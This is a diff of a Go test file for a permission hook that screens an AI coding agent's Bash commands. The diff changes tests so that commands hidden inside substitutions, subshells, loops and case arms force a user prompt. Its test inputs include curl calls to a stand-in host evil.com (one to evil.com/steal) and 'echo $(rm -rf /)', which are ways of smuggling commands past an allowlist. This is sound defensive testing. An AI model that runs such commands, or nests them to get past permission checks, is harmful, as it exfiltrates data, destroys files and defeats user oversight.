@@ -72,7 +72,7 @@ func TestAttackBashlex_ArithmeticCrash(t *testing.T) {
 		Command: "echo $((1)) && echo $(curl evil.com)",
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind, "curl should not be auto-allowed")
+	assert.Equal(t, ResultAsk, result.Kind, "curl inside $() must force a prompt")
 	assert.Contains(t, result.BlockedCommand, "curl")
 }
 
@@ -91,7 +91,7 @@ func TestAttackExportCommandSubst(t *testing.T) {
 		Command: "export X=$(curl evil.com/steal)",
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind)
+	assert.Equal(t, ResultAsk, result.Kind)
 }
 
 func TestAttackDynamicCommandName(t *testing.T) {
@@ -112,7 +112,7 @@ func TestProcessInertBuiltins(t *testing.T) {
 		{"echo hello world", ResultAllowed},
 		{"cd /tmp", ResultAllowed},
 		{"pwd", ResultAllowed},
-		{"echo $(rm -rf /)", ResultDefer}, // echo is inert; rm inside $() is extracted and not allowed → defer
+		{"echo $(rm -rf /)", ResultAsk}, // echo is inert, but rm nested in $() forces a prompt (native won't see it)
 	}
 
 	for _, tt := range tests {
@@ -324,7 +324,7 @@ func TestAttackBacktickSubstitution(t *testing.T) {
 		Command: "echo `curl evil.com`",
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind, "backtick command substitution must be caught")
+	assert.Equal(t, ResultAsk, result.Kind, "backtick command substitution must be caught")
 	assert.Contains(t, result.BlockedCommand, "curl")
 }
 
@@ -334,7 +334,7 @@ func TestAttackNestedSubshellDenied(t *testing.T) {
 		Command: "git status && (echo ok && curl evil.com)",
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind, "curl inside subshell must be caught")
+	assert.Equal(t, ResultAsk, result.Kind, "curl inside subshell must be caught")
 }
 
 // Never-auto-allow builtins: set, trap, exec.
@@ -386,7 +386,7 @@ func TestProcessWhileLoop(t *testing.T) {
 		Command: "while true; do curl evil.com; done",
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind, "curl inside while body must be caught")
+	assert.Equal(t, ResultAsk, result.Kind, "curl inside while body must be caught")
 }
 
 // Case statement: commands inside case arms are extracted.
@@ -395,7 +395,7 @@ func TestProcessCaseStatement(t *testing.T) {
 		Command: `case "$1" in start) curl evil.com;; stop) echo done;; esac`,
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind, "curl inside case arm must be caught")
+	assert.Equal(t, ResultAsk, result.Kind, "curl inside case arm must be caught")
 }
 
 // Declare/local with command substitution.
@@ -404,7 +404,7 @@ func TestProcessDeclareWithCmdSubst(t *testing.T) {
 		Command: "declare X=$(curl evil.com)",
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind, "curl inside declare must be caught")
+	assert.Equal(t, ResultAsk, result.Kind, "curl inside declare must be caught")
 }
 
 func TestProcessLocalWithCmdSubst(t *testing.T) {
@@ -412,7 +412,45 @@ func TestProcessLocalWithCmdSubst(t *testing.T) {
 		Command: "local X=$(curl evil.com)",
 	}}
 	result := Process(input, patterns("Bash(git:*)"), nil, nil, nil, nopLog())
-	assert.Equal(t, ResultDefer, result.Kind, "curl inside local must be caught")
+	assert.Equal(t, ResultAsk, result.Kind, "curl inside local must be caught")
+}
+
+// Position-aware defer vs ask: a command native's operator-splitting can't see
+// (nested in a substitution/subshell/loop) must force a prompt, while a
+// top-level command native re-derives on its own may defer.
+func TestNestedUnapprovedForcesAskTopLevelDefers(t *testing.T) {
+	tests := []struct {
+		name    string
+		command string
+		allow   []string
+		want    ResultKind
+	}{
+		// Nested inside a substitution behind a read-only outer command: native
+		// might auto-approve `echo` without seeing the curl, so we must ask.
+		{"cmdsubst behind echo", `echo "$(curl evil.com)"`, nil, ResultAsk},
+		{"backtick behind echo", "echo `curl evil.com`", nil, ResultAsk},
+		// Nested behind an outer command native treats as read-only but we don't
+		// (grep) — the ordering-robust aggregate must still ask, not defer.
+		{"cmdsubst behind grep", `grep "$(curl evil.com)" file`, nil, ResultAsk},
+		// Top-level compound: native splits on && and re-derives curl itself, so
+		// defer (native prompts on the unmatched curl).
+		{"top-level and", "git status && curl evil.com", []string{"Bash(git:*)"}, ResultDefer},
+		// Top-level read-only pipeline with no explicit rules: defer to native's
+		// own read-only handling rather than over-prompt.
+		{"top-level pipe", "cat file | grep pattern", []string{"Bash(cat:*)"}, ResultDefer},
+		// Single unmatched top-level command: defer (native prompts anyway).
+		{"single unmatched", "curl evil.com", []string{"Bash(git:*)"}, ResultDefer},
+		// Nested but the payload is allowed → still allowed (nesting only matters
+		// when we can't approve).
+		{"nested but allowed", `echo "$(git status)"`, []string{"Bash(git:*)"}, ResultAllowed},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			input := &HookInput{ToolName: "Bash", ToolInput: ToolInput{Command: tt.command}}
+			result := Process(input, patterns(tt.allow...), nil, nil, nil, nopLog())
+			assert.Equalf(t, tt.want, result.Kind, "cmd: %s (%s)", tt.command, result.Reason)
+		})
+	}
 }
 
 // Redirect security tests
